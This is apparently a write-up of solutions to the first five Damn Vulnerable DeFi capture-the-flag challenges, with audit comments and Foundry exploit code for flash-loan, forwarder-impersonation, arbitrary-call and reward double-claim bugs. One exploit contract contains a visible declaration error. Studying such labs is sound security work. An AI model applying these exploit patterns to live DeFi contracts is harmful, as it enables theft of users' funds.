# CTF-Defi
Damn Vulnerable DeFi CTF challenges
## 1. Unstoppable
Test file solution:
```
    function test_unstoppable() public checkSolvedByPlayer {
       
        token.transfer(address(vault),1e18);
        vm.expectRevert("UNAUTHORIZED");
        monitorContract.checkFlashLoan(100e18);

    }
```

core attack on:
```
convertToShares(totalSupply) != balanceBefore
```
## 2. Naive Receiver
In ```FlashLoanReceiver.sol``` line-15:
```
//@audit-issue access control problem, it ignores the first address which is essentially the initiator of the flash loan
// This means that anyone can request flash loans on behalf of this contract and make it pay the fee to the pool
```
In ```NaiveReceiverPool.sol``` line-87:
```
// @audit-issue We can craft a transaction that comes from the trusted forwarder and since we control the msg.data,
// We can make sure the last 20 bytes are any account that we wish to control.
// That way we can impersonate accounts and perform the withdraw function on their behalf
```

Test file:
```
    function test_naiveReceiver() public checkSolvedByPlayer {
        bytes[] memory callDatas=new bytes[](11);
        for(uint i=0;i<10;i++){
            callDatas[i]=abi.encodeCall(
                NaiveReceiverPool.flashLoan,(receiver,address(weth),0,"0x"));
            
        }
        callDatas[10]=abi.encodePacked(
            abi.encodeCall(
                NaiveReceiverPool.withdraw,
                (WETH_IN_POOL + WETH_IN_RECEIVER,payable(recovery))
            ),
            bytes32(uint256(uint160(deployer))) 
        );
        bytes memory multicallData=abi.encodeCall(pool.multicall,callDatas);
        BasicForwarder.Request memory request=BasicForwarder.Request(
            player,
            address(pool),
            0,
            gasleft(),
            forwarder.nonces(player),
            multicallData,
            1 days
        );
        bytes32 requestHash=keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );
        (uint8 v,bytes32 r,bytes32 s)=vm.sign(playerPk,requestHash);
        bytes memory signature=abi.encodePacked(r,s,v);

        forwarder.execute(request,signature);
    }
```
## 3. Truster
In ```TrusterLenderPool.sol``` line-28:
```
// @audit-issue This is an open external low-level call,very dangerous
```
Test file:
```
contract TrusterExploiter{
    constructor(TrusterLenderPool _pool,DamnValuableToken _token,address _recovery){
        bytes memory data=abi.encodeWithSignature("approve(address,uint256)",address(this),_token.balanceOf(address(_pool)));
        _pool.flashLoan(0,address(this),address(_token),data);
        _token.transferFrom(address(_pool),_recovery,_token.balanceOf(address(_pool)));
    }
}

 function test_truster() public checkSolvedByPlayer {
        new TrusterExploiter(pool,token,recovery);
    }

```
## 4. Side Entrance
attack on 
```
if (address(this).balance < balanceBefore) {
            revert RepayFailed();
        }
    }
```
Test file:
```
contract SideEntranceExploiter{
    SideEntrancePool public recovery;
    address public recovery;

    constructor(SideEntranceLenderPool _pool,address _recovery){
        pool= _pool;
        recovery=_recovery;
    }
    function startAttack() public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
    }
    function execute() public payable{
        pool.deposit{value:msg.value}();
    }
    receive() external payable{
        payable(recovery).transfer(address(this).balance);
    }
}

function test_sideEntrance()public checkSolvedByPlayer{
    SideEntranceExploiter exploiter = new SideEntranceExploiter(pool,recovery);
    exploiter.startAttack();
}
```
## 5. The Rewarder
In ```TheRewarderDistributor.sol``` line:71 -
```
// @audit-issue this function is very centralized and dangerous, anyone can call it and sabotage
// distributions
function clean(IERC20[] calldata tokens) external {
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20 token = tokens[i];
            if (distributions[token].remaining == 0) {
                token.transfer(owner, token.balanceOf(address(this)));
            }
        }
    }
```

Again :
```
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
        Claim memory inputClaim;
        IERC20 token;
        uint256 bitsSet; // accumulator
        uint256 amount;

        for (uint256 i = 0; i < inputClaims.length; i++) {
            inputClaim = inputClaims[i];

            // @audit-info always 0,but we don't care
            uint256 wordPosition = inputClaim.batchNumber / 256;
            uint256 bitPosition = inputClaim.batchNumber % 256;

            // @audit-info first iteration we enter here since token=0 and inputToken[0]=DVT
            // @audit-issue In the second iteration since token and inputTokens[1]=DVT,we don't enter here!
            if (token != inputTokens[inputClaim.tokenIndex]) {
                // @audit-issue first iteration we skip this since token=0
                if (address(token) != address(0)) {
                    // @audit-issue we're able to skip the _setClaimed call in the first iteration and
                    // The following iterations as long as we have multiple claims with the same token!!!
                    // That way we avoid the bitmap check and the revert here 
                    if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
                }
                // @audit-info After first iteration: token=DVT
                token = inputTokens[inputClaim.tokenIndex];
                bitsSet = 1 << bitPosition; // set bit at given position
                amount = inputClaim.amount;
            } else {
                bitsSet = bitsSet | 1 << bitPosition;
                amount += inputClaim.amount;
            }

            // for the last claim
            if (i == inputClaims.length - 1) {
                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
            }

            bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
            bytes32 root = distributions[token].roots[inputClaim.batchNumber];

            if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();

            inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
        }
    }
```
Test file:
```
function test_theRewarder() public checkSolvedByPlayer {
        string memory dvtJson=vm.readFile("test/the-rewarder/dvt-distribution.json");
        Reward[] memory dvtRewards=abi.decode(vm.parseJson(dvtJson),(Reward[]));
        
        string memory wethJson=vm.readFile("test/the-rewarder/weth-distribution.json");
        Reward[] memory wethRewards=abi.decode(vm.parseJson(wethJson),(Reward[]));

        bytes32[] memory dvtLeaves=_loadRewards("/test/the-rewarder/dvt-distribution.json");
        bytes32[] memory wethLeaves=_loadRewards("/test/the-rewarder/weth-distribution.json");


        uint256 playerDvtAmount;
        bytes32[] memory playerDvtProof;
        uint256 playerWethAmount;
        bytes32[] memory playerWethProof;
        for(uint i=0;i<dvtRewards.length;i++){
            if(dvtRewards[i].beneficiary==player){
                playerDvtAmount=dvtRewards[i].amount;
                playerWethAmount=wethRewards[i].amount;
                playerDvtProof=merkle.getProof(dvtLeaves,i);
                playerWethProof=merkle.getProof(wethLeaves,i);
                break;
            }
        }
        require(playerDvtAmount>0,"player not found in DVT distribution");
        require(playerWethAmount>0,"player not found in WETH distribution");

        IERC20[] memory tokensToClaim=new IERC20[](2);
        tokensToClaim[0]=IERC20(address(dvt));
        tokensToClaim[1]=IERC20(address(weth));

        uint256 totalClaimsNeeded=(TOTAL_DVT_DISTRIBUTION_AMOUNT/playerDvtAmount)+
                        (TOTAL_WETH_DISTRIBUTION_AMOUNT/playerWethAmount);
        uint256 dvtClaims=TOTAL_DVT_DISTRIBUTION_AMOUNT/playerDvtAmount;

        Claim[] memory claims=new Claim[] (totalClaimsNeeded);

        for(uint256 i=0;i<totalClaimsNeeded;i++){
            claims[i]=Claim({
                batchNumber:0,
                amount:i<dvtClaims ? playerDvtAmount:playerWethAmount,
                tokenIndex:i<dvtClaims?0:1,
                proof:i<dvtClaims ? playerDvtProof : playerWethProof
            });
        }

        distributor.claimRewards({inputClaims:claims, inputTokens:tokensToClaim});
        dvt.transfer(recovery,dvt.balanceOf(player));
        weth.transfer(recovery,weth.balanceOf(player));

    }

```
add huge gas limit during test in cmd /toml file: 
```
--gas-limit 99999999999999999999999999999
```
